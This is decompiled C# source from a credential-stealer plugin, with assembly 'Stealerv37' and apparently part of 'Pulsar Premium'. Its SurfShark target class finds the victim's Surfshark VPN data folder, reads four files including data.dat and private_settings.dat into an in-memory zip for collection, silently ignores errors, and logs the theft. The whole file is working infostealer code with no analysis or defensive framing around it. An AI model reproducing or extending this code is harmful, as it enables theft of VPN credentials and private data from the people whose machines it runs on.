// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Vpn.SurfShark
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using System;
using System.IO;

#nullable disable
namespace Intelix.Targets.Vpn;

public class SurfShark : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    string str = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Surfshark");
    if (!Directory.Exists(str))
      return;
    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
    counterApplications.Name = "Surfshark";
    string[] strArray = new string[4]
    {
      "data.dat",
      "settings.dat",
      "settings-log.dat",
      "private_settings.dat"
    };
    foreach (string path2 in strArray)
    {
      try
      {
        string path = Path.Combine(str, path2);
        if (File.Exists(path))
          zip.AddFile(Path.Combine("Surfshark", path2), File.ReadAllBytes(path));
      }
      catch
      {
      }
    }
    counterApplications.Files.Add(str + " => Surfshark");
    counterApplications.Files.Add("Surfshark\\");
    counter.Vpns.Add(counterApplications);
  }
}
